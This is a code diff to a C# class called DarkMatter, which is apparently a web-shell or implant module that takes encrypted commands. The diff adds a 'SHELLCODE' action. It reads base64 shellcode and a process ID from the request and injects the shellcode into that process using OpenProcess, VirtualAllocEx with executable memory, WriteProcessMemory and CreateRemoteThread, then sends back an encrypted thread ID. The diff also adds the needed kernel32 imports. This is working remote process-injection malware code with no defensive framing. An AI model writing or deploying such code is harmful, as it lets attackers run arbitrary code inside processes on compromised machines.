@@ -100,7 +100,33 @@ public class DarkMatter
             }
             else if (szAction == "SHELLCODE")
             {
-                
+                int nPid = int.Parse(dic["pid"]);
+                byte[] abBuffer = Convert.FromBase64String(dic["shellcode"]);
+
+                IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, nPid);
+                if (IntPtr.Zero == hProc)
+                    return true;
+
+                IntPtr pAlloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)abBuffer.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (IntPtr.Zero == pAlloc)
+                    return true;
+
+                bool bIsWritten = WriteProcessMemory(hProc, pAlloc, abBuffer, (uint)abBuffer.Length, out IntPtr nWritten);
+                if (!bIsWritten)
+                    return true;
+
+                IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, pAlloc, IntPtr.Zero, 0, out uint nThreadId);
+                if (IntPtr.Zero == hThread)
+                    return true;
+
+                string szOutput = nThreadId.ToString();
+                byte[] abResult = Encoding.UTF8.GetBytes(szOutput);
+                var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
+                byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abResult, 1});
+
+                response.Clear();
+                response.ContentType = "application/octet-stream";
+                response.BinaryWrite(abEncryptedResp);
             }
             else if (szAction == "UPLOAD")
             {
@@ -110,7 +136,7 @@ public class DarkMatter
                 using (FileStream fs = new FileStream(szPath, FileMode.Append, FileAccess.Write))
                     fs.Write(abBuffer, 0, abBuffer.Length);
 
-                string szOutput = "Wrote file chunk: " + abBuffer.Length.ToString();
+                string szOutput = abBuffer.Length.ToString();
                 byte[] abResult = Encoding.UTF8.GetBytes(szOutput);
                 var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
                 byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abResult, 1});
@@ -127,4 +153,21 @@ public class DarkMatter
 
         return true;
     }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+
+    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+    const uint MEM_COMMIT = 0x1000;
+    const uint MEM_RESERVE = 0x2000;
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
 }
